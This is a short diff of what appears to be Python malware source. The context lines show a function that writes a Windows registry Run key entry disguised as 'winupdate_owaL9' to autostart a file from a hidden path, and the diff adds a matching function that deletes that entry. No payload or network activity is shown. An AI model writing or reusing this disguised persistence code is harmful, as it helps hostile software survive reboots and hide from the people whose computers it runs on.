@@ -1,7 +1,3 @@
-
-
-
-
 import os
 import shutil
 import sys
@@ -16,3 +12,8 @@ def add_startup():
     winreg.SetValueEx(regkey, "winupdate_owaL9", 0, winreg.REG_SZ, f"\"{hidden_path}\"")
     winreg.CloseKey(regkey)
     
+def remove_startup():
+
+    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS)
+    winreg.DeleteValue(key, "winupdate_owaL9")
+    winreg.CloseKey(key)
